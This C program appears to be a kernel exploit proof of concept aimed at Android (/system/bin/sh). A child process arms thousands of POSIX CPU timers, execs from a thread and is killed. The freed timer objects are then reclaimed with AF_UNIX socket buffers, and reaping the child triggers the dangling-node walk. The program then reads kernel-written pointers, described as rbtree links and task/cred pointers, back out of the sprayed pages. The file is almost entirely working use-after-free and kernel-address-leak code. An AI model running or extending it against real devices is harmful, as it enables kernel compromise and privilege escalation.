/*
 * readback - reap the zombie ourselves, then diff what the kernel wrote into
 * the claimed page.
 *
 * The skb holds a reference to the order-1 page we claimed, and recv() copies
 * straight out of that page. So any byte the kernel writes there (rbtree links,
 * task/cred pointers) shows up in the next MSG_PEEK.
 *
 * The payload is all zeros: a node with __rb_parent_color == 0 makes rb_erase
 * take the "this is the root" branch and store NULL, instead of dereferencing a
 * forged parent.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <poll.h>

#define N_TIMERS 2048
#define N_STREAMS 512
#define KVA 0xffff000000000000ULL

static void noop(int s) { (void)s; }
struct lc { int fd; pid_t tid; };

static void *exec_thread(void *arg)
{
    char *argv[] = { (char *)"/system/bin/sh", (char *)"-c", (char *)"true", NULL };
    (void)arg;
    execve(argv[0], argv, NULL);
    return NULL;
}

int main(void)
{
    static int sv[N_STREAMS][2];
    static unsigned char payload[8192];
    static unsigned char before[N_STREAMS][8192];
    static unsigned char after[8192];
    int made = 0, i, j, diffs = 0;
    pid_t child;
    int pipefd[2];

    printf("=== readback (benign zero node) ===\n");
    memset(payload, 0, sizeof(payload));

    if (pipe(pipefd) != 0) return 1;
    child = fork();
    if (child == 0) {
        static timer_t many[N_TIMERS];
        struct sigevent sev;
        struct itimerspec its;
        struct sigaction sa;
        struct lc c;
        pthread_t th;
        int armed = 0;

        close(pipefd[0]);
        {
            int dn = open("/dev/null", O_WRONLY);
            if (dn >= 0) { dup2(dn, 1); dup2(dn, 2); if (dn > 2) close(dn); }
        }
        memset(&sa, 0, sizeof(sa)); sa.sa_handler = noop; sigaction(SIGRTMIN, &sa, NULL);
        memset(&sev, 0, sizeof(sev));
        sev.sigev_notify = SIGEV_SIGNAL;
        sev.sigev_signo = SIGRTMIN;
        memset(&its, 0, sizeof(its));
        its.it_value.tv_nsec = 200000L;
        its.it_interval.tv_nsec = 200000L;
        for (i = 0; i < N_TIMERS; i++) {
            if (timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &many[i]) != 0) break;
            if (timer_settime(many[i], 0, &its, NULL) != 0) break;
            armed++;
        }
        c.fd = pipefd[1];
        c.tid = (pid_t)syscall(SYS_gettid);
        (void)!write(pipefd[1], &armed, sizeof(armed));
        if (pthread_create(&th, NULL, exec_thread, &c) != 0) _exit(9);
        for (;;) pause();
    }

    close(pipefd[1]);
    {
        int armed = 0;
        if (read(pipefd[0], &armed, sizeof(armed)) != (ssize_t)sizeof(armed)) armed = -1;
        close(pipefd[0]);
        printf("child=%d timers_armed=%d\n", (int)child, armed);
    }

    usleep(2000);
    kill(child, SIGKILL);
    usleep(80000);              /* let exit_itimers free the objects */

    for (i = 0; i < N_STREAMS; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv[i]) != 0) break;
        if (send(sv[i][0], payload, sizeof(payload), MSG_DONTWAIT) != (ssize_t)sizeof(payload)) {
            close(sv[i][0]); close(sv[i][1]); break;
        }
        made++;
    }
    printf("streams claimed: %d\n", made);

    /* baseline peek (does not consume) */
    for (i = 0; i < made; i++) {
        ssize_t n = recv(sv[i][1], before[i], sizeof(before[i]), MSG_PEEK | MSG_DONTWAIT);
        if (n != (ssize_t)sizeof(before[i])) memset(before[i], 0, sizeof(before[i]));
    }
    printf("baseline captured\n");

    /* the reap: this is the moment timerqueue_del walks the dangling node */
    printf("reaping child %d ...\n", (int)child);
    fflush(stdout);
    {
        int status = 0;
        waitpid(child, &status, 0);
        printf("reaped, status=0x%x\n", status);
    }
    usleep(20000);

    for (i = 0; i < made; i++) {
        ssize_t n = recv(sv[i][1], after, sizeof(after), MSG_PEEK | MSG_DONTWAIT);
        if (n != (ssize_t)sizeof(after)) continue;
        if (memcmp(after, before[i], sizeof(after)) == 0) continue;
        for (j = 0; j + 8 <= (int)sizeof(after); j += 8) {
            uint64_t a, b;
            memcpy(&a, before[i] + j, 8);
            memcpy(&b, after + j, 8);
            if (a != b && b >= KVA) {
                printf("  DIFF stream[%d] +0x%03x : 0x%016llx -> 0x%016llx\n",
                       i, j, (unsigned long long)a, (unsigned long long)b);
                diffs++;
            }
        }
        if (diffs >= 12) break;
    }
    if (!diffs) printf("no kernel-written pointers detected in the claimed pages\n");
    return 0;
}
